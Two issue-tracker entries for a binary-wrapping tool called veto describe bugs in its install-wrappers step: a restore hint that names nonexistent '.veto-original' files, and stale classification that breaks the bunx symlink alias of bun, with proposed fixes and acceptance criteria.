The hint sends the user looking for files that don't exist. Fix: at the moment install-wrappers prints the SKIP line, scan the symlink's parent dir for any <path>.*-original sibling and name it specifically in the hint (e.g. 'restore <path>.bouncer-original'). When multiple candidates exist, list them. When none exist, fall back to a generic '<path>.*-original' hint. Acceptance: bryn's install-all output says 'restore /Users/.../bin/bun.bouncer-original' instead of 'restore /Users/.../bin/bun.veto-original'. Repro: bryn's box; install-all output 2026-06-11.

title: install-wrappers: handle sibling-symlink multiplexers (bunx→bun, rustup style)
description:
Symptom from production smoke 2026-06-11: after wrapping ~/.local/share/mise/installs/bun/1.3.6/bin/bun, the sibling ~/.local/share/mise/installs/bun/1.3.6/bin/bunx (a relative symlink './bun' — standard bun 'bunx is bun with different argv[0]' alias) was skipped as 'foreign wrapper' AND is now functionally broken (bunx exec → veto, but bunx.veto-original doesn't exist, so veto cannot find the real binary).

Two distinct bugs combine:

1) **Stale classification**. discoverWrapCandidates runs ClassifySymlink once at discovery time. When the wrap loop processes candidates, an earlier wrap can change a later candidate's effective target (bun was real Mach-O at discovery → real-wrap → bun is now veto symlink → bunx's chain now resolves to veto). The cached ClassForeignWrapper verdict is stale. Fix: re-classify at the top of applyWrapper instead of trusting c.class. OR sort candidates so a symlink's target is processed AFTER the symlink (so the original target is captured in *.veto-original BEFORE the target gets wrapped).

2) **Sibling-multiplexer wrap**. Even with fresh classification, the right wrap for bunx isn't 'bunx → veto; bunx.veto-original → ./bun' — './bun' now resolves to veto, infinite loop. The right wrap is 'bunx → veto; bunx.veto-original → ./bun.veto-original' (or a hardlink to bun.veto-original). Then exec bunx → veto with argv[0]=bunx → finds bunx.veto-original sibling → exec real Bun binary with preserved argv[0]='bunx' → Bun dispatches its bunx code path. Same abstract problem as ~/.cargo/bin/cargo → rustup (filed as veto-ynv.2), but distinct enough to track separately: bunx is an in-directory sibling alias; rustup is a cross-directory multiplexer.

Fix: when applyWrapper sees a candidate whose resolved target is another candidate in the same wrap batch, after wrapping the target, the alias gets wrapped with .veto-original pointing at the target's .veto-original. Reuse pmsurvey.ClassifySymlink to detect the target relationship.

Acceptance: bryn's bun/bunx layout after install-wrappers shows both wrapped; bunx --version exits 0 with real Bun output; no infinite loop; wrappers.json has entries for both paths.
